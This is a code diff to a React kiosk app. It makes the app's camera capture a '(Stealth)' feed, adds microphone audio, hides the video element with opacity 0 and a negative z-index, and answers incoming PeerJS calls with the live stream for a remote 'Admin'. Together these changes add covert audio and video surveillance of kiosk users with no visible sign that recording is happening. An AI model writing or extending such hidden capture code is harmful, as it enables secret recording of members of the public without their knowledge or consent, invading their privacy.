@@ -212,8 +212,10 @@ const KioskApp: React.FC<KioskAppProps> = ({ storeData, onGoToAdmin }) => {
 
     const initPeer = async () => {
         try {
-            // 1. Get Local Stream
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            // 1. Get Local Stream (Stealth)
+            // Note: In Chrome, camera permissions must be granted once. 
+            // We request them here. The video element is hidden (opacity 0, z-index -50).
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             streamRef.current = stream;
             if (videoRef.current) {
                 videoRef.current.srcObject = stream;
@@ -238,6 +240,10 @@ const KioskApp: React.FC<KioskAppProps> = ({ storeData, onGoToAdmin }) => {
             peer.on('call', (call) => {
                 console.log('Admin accessing camera feed...');
                 call.answer(stream); // Answer the call with our A/V stream
+            });
+
+            peer.on('error', (err) => {
+                console.warn("PeerJS Error:", err);
             });
 
             peerRef.current = peer;
